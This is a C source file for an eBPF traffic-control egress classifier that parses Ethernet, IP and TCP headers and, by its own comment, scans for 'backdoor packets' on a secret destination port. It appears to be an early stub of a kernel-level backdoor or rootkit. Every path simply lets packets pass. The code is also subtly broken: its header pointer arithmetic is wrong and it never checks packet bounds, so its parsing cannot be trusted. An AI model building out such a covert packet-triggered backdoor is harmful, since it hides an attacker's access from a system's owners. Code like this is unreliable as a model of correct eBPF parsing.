#include <linux/bpf.h>
#include <linux/pkt_cls.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <arpa/inet.h>
#include <linux/swab.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_helpers.h>

#include "../../../common/constants.h"

SEC("classifier/egress")
int classifier(struct __sk_buff *skb){
	void *data = (void *)(__u64)skb->data;
	void *data_end = (void *)(__u64)skb->data_end;
    bpf_printk("TC egress classifier called\n");
	
	//We are interested on parsing TCP/IP packets so let's assume we have one
	//Ethernet header
	struct ethhdr *eth_hdr = data;
	if(eth_hdr->h_proto != htons(ETH_P_IP)){
		//Not an IP packet
		return TC_ACT_OK;
	}

	//IP header
	struct iphdr *ip_hdr = (struct iphdr*)data + sizeof(struct ethhdr);
	if(ip_hdr->protocol != IPPROTO_TCP){
		return TC_ACT_OK;
	}

	//TCP header
	struct tcphdr *tcp_hdr = (struct tcphdr *)data + sizeof(struct ethhdr) + sizeof(struct iphdr);

	//We now proceed to scan for our backdoor packets

	__u16 dest_port = ntohs(tcp_hdr->dest);
	if(dest_port != SECRET_PACKET_DEST_PORT){
		return TC_ACT_OK;
	}



	return TC_ACT_OK;
	
}

char _license[4] SEC("license") = "GPL";